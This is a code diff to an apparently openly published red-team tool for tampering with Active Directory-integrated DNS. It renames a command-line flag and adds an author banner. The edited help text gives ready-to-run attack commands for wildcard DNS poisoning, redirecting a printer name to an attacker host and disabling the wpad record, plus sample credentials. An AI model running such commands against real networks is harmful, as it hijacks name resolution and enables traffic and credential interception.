@@ -57,7 +57,7 @@ namespace SharpADIDNS
 
                 if (string.IsNullOrWhiteSpace(opt.DomainDn))
                 {
-                    Logger.Err("--domain-dn is required");
+                    Logger.Err("--dn is required");
                     return ExitCodes.UsageError;
                 }
 
@@ -1099,7 +1099,7 @@ namespace SharpADIDNS
                 else if ((a == "--data" || a == "--ip") && i + 1 < args.Length) o.Data = args[++i];
                 else if (a == "--type"   && i + 1 < args.Length) o.RecordType = args[++i];
                 else if (a == "--raw"    && i + 1 < args.Length) o.RawBase64  = args[++i];
-                else if (a == "--domain-dn" && i + 1 < args.Length) o.DomainDn = args[++i];
+                else if (a == "--dn" && i + 1 < args.Length) o.DomainDn = args[++i];
                 else if (a == "--partition" && i + 1 < args.Length) o.Partition = args[++i];
                 else if (a == "--server" && i + 1 < args.Length) o.Server     = args[++i];
                 else if (a == "--ttl"    && i + 1 < args.Length)
@@ -1146,6 +1146,8 @@ namespace SharpADIDNS
         {
             Console.WriteLine();
             Console.WriteLine("SharpADIDNS  --  AD-Integrated DNS manipulation via LDAP");
+            Console.WriteLine("https://github.com/RedteamNotes/SharpADIDNS");
+            Console.WriteLine("By @RedteamNotes   Email: 888256@gmail.com");
             Console.WriteLine();
         }
 
@@ -1172,7 +1174,7 @@ namespace SharpADIDNS
             Console.WriteLine("TARGETING");
             Console.WriteLine("  --zone <fqdn>          DNS zone, e.g. corp.local                       [required]");
             Console.WriteLine("  --name <label>         Record name ('@' = apex, '*' = wildcard)        [required*]");
-            Console.WriteLine("  --domain-dn <DN>       Naming context, e.g. DC=corp,DC=local           [required]");
+            Console.WriteLine("  --dn <DN>              Naming context, e.g. DC=corp,DC=local           [required]");
             Console.WriteLine("  --partition <name>     DomainDnsZones (default) | ForestDnsZones | System");
             Console.WriteLine("  --server <host>        Target DC FQDN or IP  (default: serverless bind)");
             Console.WriteLine("                         * --name is not required for the 'enum' action");
@@ -1227,22 +1229,22 @@ namespace SharpADIDNS
         {
             Console.WriteLine("EXAMPLES");
             Console.WriteLine("  # Recon: enumerate every dnsNode in the zone");
-            Console.WriteLine("  SharpADIDNS.exe enum --zone redteamnotes.local --domain-dn DC=redteamnotes,DC=local --server dc.redteamnotes.local");
+            Console.WriteLine("  SharpADIDNS.exe enum --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local");
             Console.WriteLine();
             Console.WriteLine("  # Read one record");
-            Console.WriteLine("  SharpADIDNS.exe query --zone redteamnotes.local --name sccm --domain-dn DC=redteamnotes,DC=local");
+            Console.WriteLine("  SharpADIDNS.exe query --zone redteamnotes.local --name sccm --dn DC=redteamnotes,DC=local");
             Console.WriteLine();
             Console.WriteLine("  # Wildcard A injection (classic ADIDNS poisoning)");
-            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name \"*\" --type A --data 10.0.0.66 --domain-dn DC=redteamnotes,DC=local --ttl 600");
+            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name \"*\" --type A --data 10.0.0.66 --dn DC=redteamnotes,DC=local --ttl 600");
             Console.WriteLine();
             Console.WriteLine("  # AAAA record with explicit creds over LDAPS");
-            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name web --type AAAA --data fe80::1 --domain-dn DC=redteamnotes,DC=local --server dc.redteamnotes.local --username redteamnotes\\redpen --password 'RedteamN0t3s.' --ldaps");
+            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name web --type AAAA --data fe80::1 --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local --username redteamnotes\\redpen --password 'RedteamN0t3s.' --ldaps");
             Console.WriteLine();
             Console.WriteLine("  # CNAME redirect (preserves any AAAA on the same node)");
-            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name printer --type CNAME --data attacker.redteamnotes.local --domain-dn DC=redteamnotes,DC=local --force");
+            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name printer --type CNAME --data attacker.redteamnotes.local --dn DC=redteamnotes,DC=local --force");
             Console.WriteLine();
             Console.WriteLine("  # Soft-delete (tombstone) instead of hard remove");
-            Console.WriteLine("  SharpADIDNS.exe disable --zone redteamnotes.local --name wpad --domain-dn DC=redteamnotes,DC=local");
+            Console.WriteLine("  SharpADIDNS.exe disable --zone redteamnotes.local --name wpad --dn DC=redteamnotes,DC=local");
             Console.WriteLine();
         }
 
